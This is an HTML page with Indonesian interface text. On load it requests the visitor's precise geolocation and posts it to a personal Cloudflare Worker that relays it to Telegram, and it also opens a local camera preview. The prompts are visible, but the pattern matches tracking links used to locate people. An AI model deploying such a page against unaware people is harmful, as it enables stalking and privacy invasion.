<button id="shareLocation" type="button">
  Kirim Lokasi Saya
</button>

<p id="locationStatus" role="status" aria-live="polite">
  Meminta izin lokasi...
</p>

<script>
const WORKER_URL = "https://lokasi.qornilhakim1.workers.dev/";

const status = document.getElementById("locationStatus");
const button = document.getElementById("shareLocation");

async function ambilDanKirimLokasi() {
  if (!navigator.geolocation) {
    status.textContent = "Browser tidak mendukung lokasi.";
    return;
  }

  status.textContent = "Meminta izin dan mencari lokasi...";

  navigator.geolocation.getCurrentPosition(
    async function (position) {
      const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy
      };

      status.textContent =
        "Lokasi ditemukan. Akurasi sekitar " +
        Math.round(data.accuracy) +
        " meter. Mengirim ke Telegram...";

      try {
        const response = await fetch(WORKER_URL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(data)
        });

        const hasil = await response.json();

        if (!response.ok) {
          throw new Error(
            hasil.message || hasil.error || "HTTP " + response.status
          );
        }

        status.textContent = "Lokasi berhasil dikirim ke Telegram!";
      } catch (error) {
        console.error(error);
        status.textContent =
          "Gagal mengirim lokasi. Periksa koneksi atau log Cloudflare.";
      }
    },

    function (error) {
      status.textContent =
        "Lokasi gagal diperoleh. Izinkan akses lokasi di browser.";
    },

    {
      enableHighAccuracy: true,
      timeout: 30000,
      maximumAge: 0
    }
  );
}

// Meminta izin ketika halaman dibuka.
if (document.readyState === "complete") {
  ambilDanKirimLokasi();
} else {
  window.addEventListener(
    "load",
    ambilDanKirimLokasi,
    { once: true }
  );
}

// Tombol tetap tersedia jika pengguna ingin mencoba lagi.
button.addEventListener("click", ambilDanKirimLokasi);
</script>
<hr>
<h3>Kamera</h3>

<video
  id="cameraPreview"
  autoplay
  playsinline
  muted
  style="display:none; width:100%; max-width:400px;">
</video>

<p id="cameraStatus" role="status" aria-live="polite">
  Menyiapkan kamera...
</p>

<script>
const video = document.getElementById("cameraPreview");
const cameraStatus = document.getElementById("cameraStatus");

let cameraStream = null;

async function mintaIzinKamera() {
  if (!navigator.mediaDevices ||
      !navigator.mediaDevices.getUserMedia) {
    cameraStatus.textContent =
      "Browser tidak mendukung akses kamera atau halaman tidak menggunakan HTTPS.";
    return;
  }

  try {
    cameraStatus.textContent =
      "Meminta izin kamera...";

    cameraStream =
      await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false
      });

    video.srcObject = cameraStream;
    video.style.display = "block";

    await video.play();

    cameraStatus.textContent =
      "Kamera aktif. Pratinjau kamera ditampilkan.";
  } catch (error) {
    cameraStatus.textContent =
      "Kamera belum diizinkan atau tidak dapat dibuka. Periksa izin kamera browser.";
    console.error(error);
  }
}

// Mencoba meminta izin ketika halaman selesai dimuat.
window.addEventListener("load", mintaIzinKamera);
</script>
